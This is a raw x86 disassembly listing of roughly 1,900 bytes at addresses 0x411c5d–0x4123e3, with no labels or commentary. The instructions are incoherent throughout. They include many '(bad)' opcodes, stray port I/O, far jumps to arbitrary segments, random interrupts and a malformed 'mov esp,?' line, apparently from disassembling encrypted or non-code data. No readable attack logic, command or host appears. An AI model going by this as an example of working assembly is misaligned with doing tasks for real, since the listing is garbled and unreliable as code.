  411c5d:	les    ecx,FWORD PTR [ebp-0x50]
  411c60:	sub    al,BYTE PTR [ebx+0x7f85201]
  411c66:	retfw  0x2fa
  411c6a:	jl     0x411c68
  411c6c:	xchg   ebx,eax
  411c6d:	repnz mov al,0xb1
  411c70:	sub    bh,BYTE PTR [edi-0x7e]
  411c73:	push   cs
  411c74:	push   edi
  411c75:	int    0x8d
  411c77:	arpl   WORD PTR [edi],dx
  411c79:	sub    esi,DWORD PTR [ebx]
  411c7b:	pusha  
  411c7c:	jge    0x411ca7
  411c7e:	icebp  
  411c7f:	sub    BYTE PTR [ecx+0x10cf1a42],0x73
  411c86:	mov    ebx,esp
  411c88:	stos   DWORD PTR es:[edi],eax
  411c89:	cmp    al,0xa6
  411c8b:	ds mov ecx,fs
  411c8e:	dec    ebx
  411c8f:	js     0x411ce5
  411c91:	adc    ah,ah
  411c93:	stos   BYTE PTR es:[edi],al
  411c94:	inc    esi
  411c95:	inc    ebp
  411c96:	in     al,dx
  411c97:	clc    
  411c98:	jle    0x411c5e
  411c9a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411c9b:	pop    DWORD PTR [ebp+0x36]
  411c9e:	clc    
  411c9f:	jle    0x411cab
  411ca1:	stos   BYTE PTR es:[edi],al
  411ca2:	pop    eax
  411ca3:	mov    ds:0xfe2f53,eax
  411ca8:	std    
  411ca9:	mov    WORD PTR [di-0x10],cs
  411cad:	mov    ecx,0x68b65b11
  411cb2:	(bad)  
  411cb4:	loopne 0x411cf5
  411cb6:	in     al,dx
  411cb7:	or     DWORD PTR [ebp+0x49],esp
  411cba:	dec    edi
  411cbb:	scas   eax,DWORD PTR es:[edi]
  411cbc:	stos   BYTE PTR es:[edi],al
  411cbd:	lock mov ch,0xe6
  411cc0:	mov    WORD PTR es:[edi+0xb8ddd73],ds
  411cc7:	test   al,0x34
  411cc9:	out    0x71,al
  411ccb:	inc    ebp
  411ccc:	mov    ds:0xf609e269,al
  411cd1:	pop    ebx
  411cd2:	mov    DWORD PTR [ebx],0x28f60f5c
  411cd8:	data16 xor BYTE PTR ds:0x977a759b,al
  411cdf:	nop
  411ce0:	(bad)  
  411ce1:	pop    eax
  411ce2:	xchg   DWORD PTR [edx-0x6f5f1d81],edi
  411ce8:	clc    
  411ce9:	arpl   WORD PTR [eax],sp
  411ceb:	mov    dh,0x9a
  411ced:	jl     0x411cd6
  411cef:	cmp    al,0x4e
  411cf1:	and    ah,BYTE PTR [ebx+0x34f0c5da]
  411cf7:	int    0x34
  411cf9:	icebp  
  411cfa:	sbb    BYTE PTR [esi+0x37],bh
  411cfd:	imul   eax,esp,0x2af20bb7
  411d03:	aaa    
  411d04:	in     eax,dx
  411d05:	xlat   BYTE PTR ds:[ebx]
  411d06:	sahf   
  411d07:	pop    es
  411d08:	aaa    
  411d09:	test   esi,edi
  411d0b:	adc    DWORD PTR [edx],ecx
  411d0d:	jb     0x411ccf
  411d0f:	aam    0x53
  411d11:	lods   eax,DWORD PTR ds:[esi]
  411d12:	pop    ds
  411d13:	cld    
  411d14:	aaa    
  411d15:	xor    ah,BYTE PTR [esi-0x1c]
  411d18:	ds das 
  411d1a:	test   BYTE PTR [esi],bh
  411d1c:	add    dh,BYTE PTR [eax-0x31d124ba]
  411d22:	push   ecx
  411d23:	mov    al,ds:0x5ffed46c
  411d28:	inc    edi
  411d29:	in     al,dx
  411d2a:	and    dh,BYTE PTR [eax]
  411d2c:	jb     0x411d11
  411d2e:	cs mov cl,0xd5
  411d31:	fwait
  411d32:	push   0x258cdf1e
  411d37:	(bad)  
  411d38:	in     eax,dx
  411d39:	or     bl,dl
  411d3b:	sbb    eax,0x820a2fd8
  411d40:	test   eax,0xaecdb1ba
  411d45:	inc    eax
  411d46:	imul   ebp,DWORD PTR [eax+0x38],0x784e55f4
  411d4d:	and    BYTE PTR [ebp+0x23],0x26
  411d51:	jns    0x411d91
  411d53:	scas   eax,DWORD PTR es:[edi]
  411d54:	lahf   
  411d55:	pushf  
  411d56:	add    cl,BYTE PTR [eax+0x31687a2b]
  411d5c:	pop    eax
  411d5d:	fadd   st,st(4)
  411d5f:	gs scas al,BYTE PTR es:[edi]
  411d61:	or     ah,BYTE PTR [edx-0x1c]
  411d64:	sbb    bh,BYTE PTR [eax+0x36]
  411d67:	dec    ebp
  411d68:	imul   eax,DWORD PTR [edi+0x67],0x292d935
  411d6f:	shl    DWORD PTR [ecx],0xb6
  411d72:	cdq    
  411d73:	ins    DWORD PTR es:[edi],dx
  411d74:	sbb    DWORD PTR [eax-0x2b6901d1],esp
  411d7a:	aas    
  411d7b:	mov    esp,0xfc167f7a
  411d80:	sub    BYTE PTR [edx-0x66aa026e],al
  411d86:	fst    QWORD PTR [ecx+0x62deca9d]
  411d8c:	inc    edx
  411d8d:	fnstcw WORD PTR [edx-0x2c521e70]
  411d93:	mov    edi,0x753b9dff
  411d98:	dec    eax
  411d99:	add    DWORD PTR [esi-0xc5aaa33],eax
  411d9f:	(bad)  
  411da0:	in     al,dx
  411da1:	push   ss
  411da2:	jno    0x411d5b
  411da4:	or     al,0xb
  411da6:	pop    ecx
  411da7:	mov    cl,0x4
  411da9:	jbe    0x411d5f
  411dab:	(bad)  
  411dac:	popa   
  411dad:	pop    eax
  411dae:	call   0x9db2:0x8ffae699
  411db5:	scas   al,BYTE PTR es:[edi]
  411db6:	cld    
  411db7:	push   cs
  411db8:	cdq    
  411db9:	and    al,0x22
  411dbb:	dec    ebp
  411dbc:	stc    
  411dbd:	in     eax,dx
  411dbe:	lds    ebx,FWORD PTR [esi-0x80]
  411dc1:	or     al,0xb8
  411dc3:	(bad)  
  411dc4:	or     BYTE PTR [esi],bh
  411dc6:	retf   0x60c9
  411dc9:	lahf   
  411dca:	sub    eax,0xf153c309
  411dcf:	pop    edi
  411dd0:	lea    ebp,[eax+0x62]
  411dd3:	scas   al,BYTE PTR es:[edi]
  411dd4:	out    0x57,al
  411dd6:	stos   DWORD PTR es:[edi],eax
  411dd7:	sar    bh,1
  411dd9:	scas   al,BYTE PTR es:[edi]
  411dda:	cmp    edi,ebx
  411ddc:	jbe    0x411e36
  411dde:	pop    eax
  411ddf:	in     eax,0x14
  411de1:	aaa    
  411de2:	pop    edi
  411de3:	inc    edx
  411de4:	je     0x411d93
  411de6:	push   ecx
  411de7:	jl     0x411dd1
  411de9:	outs   dx,DWORD PTR ds:[esi]
  411dea:	jne    0x411d76
  411dec:	push   ecx
  411ded:	jge    0x411da6
  411def:	adc    DWORD PTR [eax+0x39],ebp
  411df2:	fisub  DWORD PTR [edi+0x11]
  411df5:	jge    0x411d90
  411df7:	cmp    bh,BYTE PTR [esi+ebx*4-0x69]
  411dfb:	ss xchg esi,eax
  411dfd:	scas   eax,DWORD PTR es:[edi]
  411dfe:	sbb    eax,DWORD PTR [edx-0x7ce0ce10]
  411e04:	or     DWORD PTR [ecx+0x7b5a139f],0x51
  411e0b:	in     eax,dx
  411e0c:	or     BYTE PTR [ebp+eiz*2-0x1e939499],dh
  411e13:	cmp    ch,BYTE PTR [ecx]
  411e15:	sub    eax,0xe16d16e
  411e1a:	cmp    ecx,eax
  411e1c:	jmp    0x1f3b:0xd97f423a
  411e23:	mov    BYTE PTR ds:0xc0d20253,ah
  411e29:	dec    edi
  411e2a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411e2b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411e2c:	ror    dh,0x4f
  411e2f:	adc    DWORD PTR [esp+ecx*8],0xffffff88
  411e33:	ret    
  411e34:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411e35:	push   ebp
  411e36:	out    0x6f,al
  411e38:	fdiv   DWORD PTR [esi-0x6edbcb5b]
  411e3e:	and    edx,esp
  411e40:	arpl   WORD PTR [eax-0x67],ax
  411e43:	divps  xmm5,XMMWORD PTR [eax+0x4f]
  411e47:	xchg   BYTE PTR [esi-0x4fe6684c],dh
  411e4d:	out    0xdb,eax
  411e4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411e50:	add    BYTE PTR [edi-0x4de779bf],dl
  411e56:	push   edx
  411e57:	push   edi
  411e58:	shl    esi,1
  411e5a:	repz push ecx
  411e5c:	add    DWORD PTR [esi+eiz*2],ebp
  411e5f:	jl     0x411de2
  411e61:	mov    dl,BYTE PTR ds:0xa92a8297
  411e67:	sub    eax,0xd4ed2d98
  411e6c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411e6d:	lock xchg esp,eax
  411e6f:	jno    0x411e12
  411e71:	add    eax,0xec6ad341
  411e76:	pop    eax
  411e77:	cwde   
  411e78:	repz add cl,BYTE PTR [eax+0x19]
  411e7c:	xor    DWORD PTR [eax+ecx*4+0x5367700d],edx
  411e83:	sbb    esp,DWORD PTR [ebp-0x28]
  411e86:	jno    0x411eec
  411e88:	cs sbb al,0x36
  411e8b:	sbb    DWORD PTR [eax+0xb53831d],edx
  411e91:	inc    ecx
  411e92:	or     ch,BYTE PTR [edx-0x1e615696]
  411e98:	scas   al,BYTE PTR es:[edi]
  411e99:	push   es
  411e9a:	dec    ecx
  411e9b:	inc    edx
  411e9c:	push   ds
  411e9d:	(bad)  
  411e9e:	icebp  
  411e9f:	mov    ah,0xfd
  411ea1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411ea2:	rcr    DWORD PTR [edi],cl
  411ea4:	xchg   esp,esi
  411ea6:	lods   eax,DWORD PTR ds:[esi]
  411ea7:	adc    ah,0x70
  411eaa:	mov    eax,0xdc559a35
  411eaf:	xchg   BYTE PTR [edx+0x739a8d2c],dh
  411eb5:	aam    0x49
  411eb7:	lahf   
  411eb8:	test   DWORD PTR [esp+ecx*4+0x2b5ec4fd],eax
  411ebf:	jb     0x411ef3
  411ec1:	je     0x411ef9
  411ec3:	rcr    DWORD PTR [edi-0x19],1
  411ec6:	fs jno 0x411f29
  411ec9:	hlt    
  411eca:	rol    bh,0xd
  411ecd:	mov    WORD PTR [edx],ss
  411ecf:	and    ecx,eax
  411ed1:	push   esp
  411ed2:	bound  esi,QWORD PTR [ecx]
  411ed4:	mov    ch,ah
  411ed6:	add    ebx,edx
  411ed8:	dec    edi
  411ed9:	or     BYTE PTR [esi-0x34],al
  411edc:	pop    edi
  411edd:	lahf   
  411ede:	xor    BYTE PTR [edi+0x667dd5e2],ah
  411ee4:	fsub   DWORD PTR [eax+0x13863b08]
  411eea:	dec    ebx
  411eeb:	mov    ah,ch
  411eed:	adc    BYTE PTR [ebp-0x3b],dh
  411ef0:	outs   dx,DWORD PTR ds:[esi]
  411ef1:	jp     0x411e89
  411ef3:	fsubr  st(2),st
  411ef5:	sbb    eax,0x1869ed13
  411efa:	aaa    
  411efb:	iret   
  411efc:	leave  
  411efd:	cmp    DWORD PTR [esi+0x17],ebx
  411f00:	int    0xc1
  411f02:	pusha  
  411f03:	popf   
  411f04:	call   0x2a06684e
  411f09:	cmp    BYTE PTR [edi],ah
  411f0b:	jae    0x411f2a
  411f0d:	sub    esp,ecx
  411f0f:	cmp    eax,DWORD PTR [ecx+0x2]
  411f12:	sbb    bh,BYTE PTR ds:0xe12d798a
  411f18:	retf   0xbf55
  411f1b:	dec    edx
  411f1c:	std    
  411f1d:	test   BYTE PTR [edi],dl
  411f1f:	xlat   BYTE PTR ds:[ebx]
  411f20:	jbe    0x411f28
  411f22:	or     ah,0xe7
  411f25:	mov    esi,0x3b443332
  411f2a:	jne    0x411eb6
  411f2c:	into   
  411f2d:	pop    ss
  411f2e:	imul   ecx,esp,0xac83c427
  411f34:	mov    eax,DWORD PTR [ebx]
  411f36:	dec    edx
  411f37:	jno    0x411f2c
  411f39:	ins    DWORD PTR es:[edi],dx
  411f3a:	sub    al,BYTE PTR [edx]
  411f3c:	cmp    al,0x24
  411f3e:	out    0x84,eax
  411f40:	cdq    
  411f41:	cld    
  411f42:	and    DWORD PTR gs:[edi],0xffffff84
  411f46:	mov    ds:0x372d44ba,al
  411f4b:	jge    0x411f48
  411f4d:	push   esi
  411f4e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411f4f:	stos   DWORD PTR es:[edi],eax
  411f50:	push   cs
  411f51:	rcl    DWORD PTR [ecx],1
  411f53:	lds    edi,FWORD PTR ds:0x706cc583
  411f59:	in     al,0x71
  411f5b:	cwde   
  411f5c:	sub    esi,DWORD PTR [ebx]
  411f5e:	inc    edx
  411f5f:	mov    BYTE PTR [eax],ah
  411f61:	outs   dx,DWORD PTR ds:[esi]
  411f62:	lea    edi,[ecx]
  411f64:	mov    ss:0x4a23172d,al
  411f6a:	and    DWORD PTR [esi+0x4e],eax
  411f6d:	enter  0xfbbc,0x48
  411f71:	icebp  
  411f72:	mov    ecx,0xe55feecb
  411f77:	ja     0x411f52
  411f79:	mov    ah,0x49
  411f7b:	push   ebx
  411f7c:	cmp    esi,DWORD PTR [eax+0x4e]
  411f7f:	pop    edx
  411f80:	mov    dl,0x53
  411f82:	or     esp,ecx
  411f84:	and    edi,ebx
  411f86:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411f87:	outs   dx,BYTE PTR ds:[esi]
  411f88:	lock mov ch,0x3d
  411f8b:	loopne 0x411fcf
  411f8d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411f8e:	fidivr DWORD PTR [ecx-0xde90899]
  411f94:	dec    edx
  411f95:	aaa    
  411f96:	aas    
  411f97:	inc    ebx
  411f98:	push   0xb80414e7
  411f9d:	push   eax
  411f9e:	and    ch,BYTE PTR [ebp+0x33]
  411fa1:	ror    esp,1
  411fa3:	add    eax,esi
  411fa5:	mov    ah,0xd5
  411fa7:	sti    
  411fa8:	retf   0x99b6
  411fab:	cwde   
  411fac:	into   
  411fad:	and    esp,DWORD PTR [edx]
  411faf:	mov    ds:0xd2a70648,al
  411fb4:	cmp    cl,dl
  411fb6:	pop    edx
  411fb7:	xor    al,0xc
  411fb9:	cmc    
  411fba:	loopne 0x411fee
  411fbc:	jge    0x411fbf
  411fbe:	int    0x60
  411fc0:	xor    edi,esi
  411fc2:	rcl    BYTE PTR ds:0x99819d67,0xaf
  411fc9:	(bad)
  411fcc:	in     eax,dx
  411fcd:	inc    esp
  411fce:	jb     0x41202b
  411fd0:	inc    edi
  411fd1:	sbb    ah,BYTE PTR [ebx]
  411fd3:	enter  0x5f5e,0x7e
  411fd7:	mov    dl,0x6c
  411fd9:	adc    al,BYTE PTR [edx+ecx*2-0x4a39ee77]
  411fe0:	inc    edi
  411fe1:	cmc    
  411fe2:	pushf  
  411fe3:	mov    ch,0xbe
  411fe5:	pop    ecx
  411fe6:	adc    eax,0xb65eff19
  411feb:	fisttp DWORD PTR [ebp-0x50]
  411fee:	or     DWORD PTR [ebp+0x1eaddd28],esi
  411ff4:	cs retf 
  411ff6:	pop    ecx
  411ff7:	jmp    0x90e7de57
  411ffc:	in     eax,0x4e
  411ffe:	cs dec edx
  412000:	les    esi,FWORD PTR [eax+0x419e38e9]
  412006:	stc    
  412007:	jnp    0x412022
  412009:	jnp    0x412062
  41200b:	sbb    DWORD PTR [edx-0x59],edi
  41200e:	dec    ebx
  41200f:	pop    ecx
  412010:	xchg   edi,eax
  412011:	inc    ecx
  412012:	ret    0x7548
  412015:	pop    esp
  412016:	stc    
  412017:	dec    eax
  412018:	shr    DWORD PTR [ebp+0x33],cl
  41201b:	lods   eax,DWORD PTR ds:[esi]
  41201c:	or     BYTE PTR [esi-0x887573],bl
  412022:	jns    0x411fd2
  412024:	dec    edi
  412025:	daa    
  412026:	cmp    DWORD PTR [esi],ebp
  412028:	imul   ecx,DWORD PTR [ecx],0x2a3d7f08
  41202e:	cli    
  41202f:	pop    es
  412030:	and    DWORD PTR [ecx+0x14d53335],esp
  412036:	int3   
  412037:	vcmpps xmm3,xmm3,XMMWORD PTR [ecx+edx*4-0x6a460711],0x50
  412041:	es push 0xd2087e60
  412047:	sbb    eax,0x16894bc2
  41204c:	cmp    al,0x46
  41204e:	adc    cl,BYTE PTR [edi+0x421d457]
  412054:	adc    dh,BYTE PTR [eax]
  412056:	cwde   
  412057:	rcl    DWORD PTR [eax+0x1d6703fe],1
  41205d:	xchg   ebp,eax
  41205e:	ror    ecx,cl
  412060:	rol    DWORD PTR [esi],0x46
  412063:	rcl    BYTE PTR [ebx-0x1875c13d],0x6f
  41206a:	loop   0x411ff9
  41206c:	lahf   
  41206d:	into   
  41206e:	or     ecx,edx
  412070:	aam    0x3e
  412072:	push   ebx
  412073:	(bad)  
  412075:	push   eax
  412076:	mov    bl,BYTE PTR [eax]
  412078:	cmp    eax,0x2e6cdf89
  41207d:	add    eax,0xeac2775a
  412082:	arpl   WORD PTR [edi+ecx*1+0x78],dx
  412086:	mov    edx,ebp
  412088:	int3   
  412089:	repnz mov eax,ds:0xc16b2f53
  41208f:	ds jmp 0x526:0xbcd08be1
  412097:	cmp    BYTE PTR [ebx+0x7d],cl
  41209a:	lahf   
  41209b:	add    eax,0x862f983f
  4120a0:	xchg   ebx,eax
  4120a1:	xchg   edi,eax
  4120a2:	push   ecx
  4120a3:	xchg   DWORD PTR [esi-0x17],ebp
  4120a6:	mov    al,ds:0xc698fa2b
  4120ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4120ac:	(bad)  
  4120ad:	test   BYTE PTR [esi+0x11],0xed
  4120b1:	add    bl,al
  4120b3:	inc    esp
  4120b4:	jno    0x4120e8
  4120b6:	in     al,dx
  4120b7:	cdq    
  4120b8:	lea    ebx,[eax-0x55]
  4120bb:	rol    BYTE PTR [eax+eax*1+0xc],cl
  4120bf:	adc    eax,0x86bcdc59
  4120c4:	pop    edx
  4120c5:	dec    edx
  4120c6:	test   DWORD PTR [edi+0x3e088cd3],edx
  4120cc:	aaa    
  4120cd:	lds    esi,FWORD PTR [ecx-0x19]
  4120d0:	mov    BYTE PTR [eax+edi*4+0x34],bl
  4120d4:	adc    ebp,DWORD PTR cs:[eax-0x3c39fcd0]
  4120db:	ror    dh,cl
  4120dd:	shl    DWORD PTR [eax-0x2ded6e5a],0x38
  4120e4:	jno    0x412157
  4120e6:	lods   al,BYTE PTR ds:[esi]
  4120e7:	enter  0x9004,0xe
  4120eb:	jb     0x4120d7
  4120ed:	jmp    0x9b1d3f6b
  4120f2:	xor    al,0xe9
  4120f4:	cdq    
  4120f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4120f6:	aam    0x54
  4120f8:	(bad)  
  4120fa:	mov    WORD PTR [edx],fs
  4120fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4120fd:	ins    BYTE PTR es:[edi],dx
  4120fe:	lahf   
  4120ff:	shr    DWORD PTR [ecx],0xe5
  412102:	and    ecx,DWORD PTR [ecx+0x2b3fa156]
  412108:	in     eax,dx
  412109:	jp     0x4120fa
  41210b:	dec    ebp
  41210c:	test   esi,ebp
  41210e:	ins    DWORD PTR es:[edi],dx
  41210f:	mov    eax,ds:0x358baaa6
  412114:	dec    ecx
  412115:	xor    eax,0x3a90ce0e
  41211a:	(bad)  
  41211b:	mov    ecx,0xbe2e6d8f
  412120:	mov    cs,WORD PTR [ebx+edx*4+0x27b1c11a]
  412127:	out    0x8,eax
  412129:	es push ebp
  41212b:	cmp    bl,BYTE PTR [edx-0x34]
  41212e:	add    DWORD PTR [edx],esp
  412130:	lods   al,BYTE PTR ds:[esi]
  412131:	mov    al,0xc1
  412133:	test   DWORD PTR ds:0xefceae27,0xbb108bc
  41213d:	nop
  41213e:	pop    es
  41213f:	jmp    0x760:0x837e7a92
  412146:	add    eax,0x5319b935
  41214b:	scas   al,BYTE PTR es:[edi]
  41214c:	mov    esi,cs
  41214e:	cmc    
  41214f:	mov    al,0xe0
  412151:	cdq    
  412152:	pop    ebp
  412153:	push   ss
  412154:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412155:	mov    edi,0xe1db3aa
  41215a:	xor    edx,DWORD PTR [eax+0x38]
  41215d:	fdivr  DWORD PTR ds:0xfa9e761c
  412163:	pop    ecx
  412164:	push   esi
  412165:	fwait
  412166:	mov    al,0xca
  412168:	mov    esp,?
  41216a:	add    eax,0xeb91482
  41216f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412170:	out    0xaa,eax
  412172:	loope  0x4121a9
  412174:	in     eax,dx
  412175:	rcr    DWORD PTR [edx-0x1f42e440],0x8a
  41217c:	jbe    0x4121b1
  41217e:	pop    ecx
  41217f:	aas    
  412180:	mov    ebp,0x9c888414
  412185:	cwde   
  412186:	pop    ebp
  412187:	xor    al,0x57
  412189:	push   esi
  41218a:	pop    ebx
  41218b:	fidiv  WORD PTR [edx]
  41218d:	inc    ecx
  41218e:	pop    ebp
  41218f:	and    DWORD PTR [edi+0x593cef35],ecx
  412195:	xlat   BYTE PTR ds:[ebx]
  412196:	arpl   WORD PTR [ebx+0x4a],ax
  412199:	mov    ebp,0xc81dd70b
  41219e:	sar    DWORD PTR [eax-0x53879797],cl
  4121a4:	scas   al,BYTE PTR es:[edi]
  4121a5:	mov    ds:0x1bd92743,al
  4121aa:	jns    0x4121d4
  4121ac:	dec    esp
  4121ad:	retf   
  4121ae:	inc    edx
  4121af:	xor    eax,0x97c532d4
  4121b4:	inc    esp
  4121b5:	dec    edx
  4121b6:	push   edx
  4121b7:	loopne 0x412146
  4121b9:	call   0x14863889
  4121be:	test   DWORD PTR [ecx-0x18],0xfa7faab8
  4121c5:	xor    al,0x60
  4121c8:	push   edx
  4121c9:	jl     0x412210
  4121cb:	mov    edx,0x10bd645d
  4121d0:	(bad)  
  4121d1:	in     al,0x3e
  4121d3:	rcr    BYTE PTR [eax],cl
  4121d5:	iret   
  4121d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4121d7:	mov    BYTE PTR ds:0xa0850369,bl
  4121dd:	stos   BYTE PTR es:[edi],al
  4121de:	mov    dl,0xe9
  4121e0:	(bad)  
  4121e1:	jno    0x412182
  4121e3:	pop    edi
  4121e4:	test   DWORD PTR [eax-0x7745ecbb],ebp
  4121ea:	sub    ebx,DWORD PTR [edi]
  4121ec:	es loope 0x4121fb
  4121ef:	cli    
  4121f0:	sbb    eax,0x5186c94b
  4121f5:	adc    BYTE PTR [ecx+edx*4-0x56],al
  4121f9:	adc    ebx,edi
  4121fb:	and    ah,BYTE PTR [eax+0x1b]
  4121fe:	mov    dh,0xf7
  412200:	fisttp QWORD PTR [esi+eiz*2]
  412203:	add    al,0xa1
  412205:	(bad)  
  412206:	mov    esi,DWORD PTR [eax+0x3b8b2e20]
  41220c:	ror    BYTE PTR [edx],1
  41220e:	adc    ebp,ebx
  412210:	dec    ecx
  412211:	aad    0x2a
  412213:	sar    bh,1
  412215:	sar    esi,cl
  412217:	not    bl
  412219:	xchg   ebx,eax
  41221a:	or     DWORD PTR ds:0x5358eec9,ecx
  412220:	sub    eax,0xe523b21f
  412225:	in     eax,0x8d
  412227:	jne    0x412219
  412229:	popa   
  41222a:	leave  
  41222b:	repnz pop esp
  41222d:	push   ecx
  41222e:	cld    
  41222f:	or     BYTE PTR [edx],0x3c
  412232:	lock cmpxchg DWORD PTR [ebp+0xcc1c952],edx
  41223a:	mov    eax,0x7ec4831e
  41223f:	(bad)  
  412240:	(bad)  
  412241:	fld    DWORD PTR [ecx]
  412243:	or     al,0x33
  412245:	(bad)  
  412246:	call   ebx
  412248:	(bad)  
  412249:	xchg   esp,eax
  41224a:	fcomip st,st(3)
  41224c:	cmp    edx,DWORD PTR [edx-0x59]
  41224f:	retf   0x357b
  412252:	lahf   
  412253:	sub    ch,BYTE PTR [edx+ebx*1+0x16406d6]
  41225a:	arpl   WORD PTR [eax+0x25],sp
  41225d:	aam    0x67
  41225f:	jne    0x4122b2
  412261:	sbb    BYTE PTR [ecx],bh
  412263:	cmp    BYTE PTR [eax+0x1f],0xff
  412267:	repz sbb ebp,ecx
  41226a:	in     eax,dx
  41226b:	leave  
  41226c:	push   0xd
  41226e:	xlat   BYTE PTR ds:[ebx]
  41226f:	test   esi,ebp
  412271:	lock mov edx,cs
  412274:	imul   ebx,DWORD PTR [edi-0x7ab76fe1],0x23a707fd
  41227e:	pop    es
  41227f:	or     ch,BYTE PTR [ebp+0x5655ba5a]
  412285:	cmp    DWORD PTR [eax-0x40],edi
  412288:	ds into 
  41228a:	push   esp
  41228b:	xchg   esp,eax
  41228c:	sar    DWORD PTR [ebp-0x184dd6bd],1
  412292:	imul   ebx,DWORD PTR ds:0x37876f93,0x38
  412299:	pop    es
  41229a:	es jle 0x4122ce
  41229d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41229e:	dec    eax
  41229f:	adc    DWORD PTR [ecx-0x7a],eax
  4122a2:	inc    ecx
  4122a3:	into   
  4122a4:	retf   0x7f5b
  4122a7:	cwde   
  4122a8:	mov    cs,WORD PTR [ecx-0x14feda92]
  4122ae:	arpl   WORD PTR cs:[esi],cx
  4122b1:	inc    ecx
  4122b2:	fwait
  4122b3:	retf   0x1eba
  4122b6:	inc    edx
  4122b7:	inc    ecx
  4122b8:	ret    
  4122b9:	(bad)  
  4122ba:	(bad)  
  4122bb:	rol    DWORD PTR [edx],0x39
  4122be:	or     ecx,edi
  4122c0:	scas   eax,DWORD PTR es:[edi]
  4122c1:	ins    DWORD PTR es:[edi],dx
  4122c2:	sbb    al,0x7e
  4122c4:	push   ss
  4122c5:	adc    eax,0x3bbb21a9
  4122ca:	mov    dh,0x60
  4122cc:	inc    edx
  4122cd:	pusha  
  4122ce:	dec    edi
  4122cf:	(bad)  
  4122d0:	sbb    DWORD PTR [edx+0x1a2dcfd2],ecx
  4122d6:	fwait
  4122d7:	std    
  4122d8:	int    0x86
  4122da:	mov    edx,0x520b95e3
  4122df:	inc    esi
  4122e0:	sbb    BYTE PTR [edx+eiz*1-0x80],ah
  4122e4:	shl    BYTE PTR [eax+edx*4],1
  4122e7:	push   es
  4122e8:	rcl    BYTE PTR [eax+ebx*1-0x40b7584e],1
  4122ef:	mov    ch,0x95
  4122f1:	xor    BYTE PTR [edi-0x7d],0x10
  4122f5:	clc    
  4122f6:	mov    eax,0xadc801e4
  4122fb:	mov    cx,0x9223
  4122ff:	pushf  
  412300:	pop    ecx
  412301:	or     BYTE PTR [ebx+0x2a],cl
  412304:	ret    
  412305:	aaa    
  412306:	jmp    0x4122b7
  412308:	mov    esi,0x2809a573
  41230d:	pop    esp
  41230e:	mov    cl,0x49
  412310:	jmp    0x6571:0xcf2c6b8d
  412317:	dec    edx
  412318:	loope  0x41234b
  41231a:	or     DWORD PTR [ebp-0x24],ecx
  41231d:	enter  0x919,0xa5
  412321:	stos   DWORD PTR es:[edi],eax
  412322:	jae    0x412342
  412324:	pop    ebx
  412325:	je     0x412370
  412327:	add    dh,cl
  412329:	mov    edi,0xb9fe286e
  41232e:	cld    
  41232f:	(bad)  
  412331:	pop    ebx
  412332:	inc    edi
  412333:	and    DWORD PTR [eax+edx*1],ebx
  412336:	xchg   ebx,eax
  412337:	inc    esp
  412338:	nop
  412339:	aad    0x10
  41233b:	xlat   BYTE PTR ds:[ebx]
  41233c:	repz mov bl,0x60
  41233f:	pop    ss
  412340:	pop    edi
  412341:	sub    BYTE PTR [eax-0x70988e88],dl
  412347:	cmp    BYTE PTR [edi],dl
  412349:	or     ebp,DWORD PTR ds:0x1c256ca
  41234f:	cmc    
  412350:	fld    QWORD PTR [eax+0x59]
  412353:	xchg   edx,eax
  412354:	cwde   
  412355:	inc    ebp
  412356:	xor    edi,eax
  412358:	pusha  
  412359:	sahf   
  41235a:	mov    edx,0xfc4c5b9f
  41235f:	call   0xefc12399
  412364:	pop    ss
  412365:	mov    bh,0x7a
  412367:	icebp  
  412368:	into   
  412369:	xor    ebp,DWORD PTR [ebx-0x1ee711cf]
  41236f:	jge    0x41233c
  412371:	xchg   edx,eax
  412372:	(bad)  
  412373:	ja     0x4123d6
  412375:	and    eax,DWORD PTR [esi]
  412377:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412378:	clc    
  412379:	bound  edi,QWORD PTR [eax+0xbaecf4c]
  41237f:	and    eax,0xeae0571e
  412384:	out    dx,al
  412385:	lea    ecx,ds:0x7cd478b1
  41238b:	jmp    0xc7f4:0x6d8e511d
  412392:	les    esp,FWORD PTR [esi]
  412394:	mov    ecx,0xdf2771f4
  412399:	popa   
  41239a:	(bad)  
  41239b:	xlat   BYTE PTR ds:[ebx]
  41239c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41239d:	aad    0x8f
  41239f:	lods   al,BYTE PTR ds:[esi]
  4123a0:	and    al,0xc
  4123a2:	or     edx,DWORD PTR [ebp-0x9feaaf2]
  4123a8:	call   0x2e0c5a03
  4123ad:	pop    esi
  4123ae:	addr16 pop ebp
  4123b0:	cmp    DWORD PTR [ebx+0x2f5105db],edx
  4123b6:	adc    dh,bh
  4123b8:	push   ebp
  4123b9:	in     eax,dx
  4123ba:	in     al,dx
  4123bb:	dec    ebx
  4123bc:	mov    esi,edx
  4123be:	jbe    0x41235b
  4123c0:	cmc    
  4123c1:	or     DWORD PTR [edi-0xbda7476],ecx
  4123c7:	mov    dl,0xed
  4123c9:	nop
  4123ca:	xchg   esp,eax
  4123cb:	leave  
  4123cc:	(bad)  
  4123cd:	mul    DWORD PTR gs:0xa796f259
  4123d4:	inc    esp
  4123d5:	ja     0x41236e
  4123d7:	out    dx,al
  4123d8:	out    dx,al
  4123d9:	xchg   esp,eax
  4123da:	int    0xcb
  4123dc:	pcmpeqw mm2,QWORD PTR [edx+0x66]
  4123e0:	fwait
  4123e1:	in     al,dx
  4123e2:	stos   DWORD PTR es:[edi],eax
  4123e3:	mov    bh,0xd0
